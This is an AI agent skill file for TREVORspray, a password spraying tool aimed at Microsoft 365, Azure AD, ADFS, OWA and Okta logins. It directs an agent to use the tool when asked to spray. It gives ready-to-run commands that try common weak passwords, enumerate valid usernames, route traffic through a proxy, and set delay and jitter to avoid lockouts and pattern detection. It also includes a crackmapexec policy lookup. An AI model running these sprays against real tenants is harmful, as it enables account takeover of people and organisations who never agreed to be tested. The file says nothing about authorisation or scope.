---
name: trevorspray
description: "Threaded password spraying tool targeting Microsoft 365, Azure AD, ADFS, and on-prem Active Directory. Use when asked to perform password spraying against Office 365, Azure, or AD environments, enumerate valid usernames, or test lockout-safe spraying with jitter and delay controls."
license: GPL-3.0
compatibility: "Linux, macOS. Install: pip install trevorspray or git clone + pip install -e ."
metadata:
  author: AeonDave
  version: "1.0"
---

# TREVORspray

Modular, threaded password spraying tool for Microsoft/Azure/AD targets.

## Quick Start

```bash
# Spray M365 with a single password
trevorspray -u users.txt -p "Summer2024!" --module msol

# Spray on-prem AD via ADFS
trevorspray -u users.txt -p "Password123" --module adfs -t https://adfs.target.com

# Enumerate valid users only (no password)
trevorspray -u users.txt --module msol --enum
```

## Core Flags

| Flag | Description |
|------|-------------|
| `-u <file>` | Username file (or single username) |
| `-p <pass>` | Password to spray |
| `-P <file>` | Password list (spray each, with delay) |
| `--module <mod>` | Target module |
| `-t <url>` | Target URL (for ADFS/OWA modules) |
| `--threads <n>` | Threads (default 1) |
| `--delay <s>` | Delay between requests (seconds) |
| `--jitter <s>` | Random jitter added to delay |
| `--lockout-delay <s>` | Wait after potential lockout |
| `--enum` | Username enumeration only |
| `-o <file>` | Output file |
| `--reauth` | Re-authenticate after delay (for expired tokens) |
| `--proxy <url>` | Proxy |

## Modules

| Module | Target |
|--------|--------|
| `msol` | Microsoft Online / Office 365 |
| `adfs` | Active Directory Federation Services |
| `owa` | Outlook Web Access |
| `lync` | Skype for Business |
| `okta` | Okta SSO |

## Common Workflows

```bash
# Safe M365 spray — 1 attempt per 30 min to avoid lockouts
trevorspray -u users.txt -p "Spring2024!" --module msol --delay 1800 --jitter 60

# Enumerate valid M365 users (no lockout risk)
trevorspray -u users.txt --module msol --enum -o valid_users.txt

# ADFS spray with proxy
trevorspray -u users.txt -p "Password1" --module adfs -t https://sts.target.com \
  --delay 60 --jitter 30 --proxy http://127.0.0.1:8080

# Multi-password spray with controlled delay
trevorspray -u valid_users.txt -P passwords.txt --module msol --delay 3600
```

## Lockout Awareness

- Check password policy before spraying: `crackmapexec smb <dc> --pass-pol`
- Use `--delay 3600` (1 hour) for environments with 1-attempt/hour lockout policies
- Prefer `--enum` first to reduce invalid user noise
- Jitter prevents pattern detection: `--delay 1800 --jitter 300`

## Resources

| File | When to load |
|------|--------------|
| `references/lockout-policy.md` | Lockout policy detection, safe timing calculations, user enumeration techniques |
